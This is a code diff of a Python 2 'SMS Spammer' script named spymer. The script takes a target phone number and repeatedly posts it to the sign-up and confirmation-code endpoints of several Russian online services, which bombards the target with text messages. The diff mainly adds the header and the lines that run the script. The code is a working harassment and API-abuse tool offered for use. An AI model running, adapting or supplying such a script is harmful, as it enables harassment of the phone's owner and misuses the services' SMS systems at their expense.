@@ -1,13 +1,13 @@
+#!/usr/bin/python
+# spymer v1
+# Author: FSystem88
 class spymer:
-	author = ''
-
 	def main(self):
 		print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.2.1      8888\n8888888888888888888888888\n8888888888888888888888888\n'
 		import requests, datetime, sys, time, argparse
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. Only for Russia!", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
 		args = parser.parse_args()
-		
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
 			icon = '*'
@@ -18,22 +18,17 @@ class spymer:
 					icon == '*'
 			message = '[' + icon + '][' + now + ']' + message
 			return message
-			
 		def wrapsbrace(string, endspace=False):
 			if endspace == True:
 				return '[' + string + '] '
 			return '[' + string + ']'
-
 		def sleep(x):
 			try:
 				time.sleep(x)
 			except KeyboardInterrupt:
 				print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
 				exit()
-				
-			
 		_phone = args.phonenum
-		
 		iteration = 0			
 		_phone9 = _phone[1:]
 		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
@@ -56,3 +51,5 @@ class spymer:
 			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
 			mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
 			ostin = requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin})
+spammer = spymer()
+spammer.main()
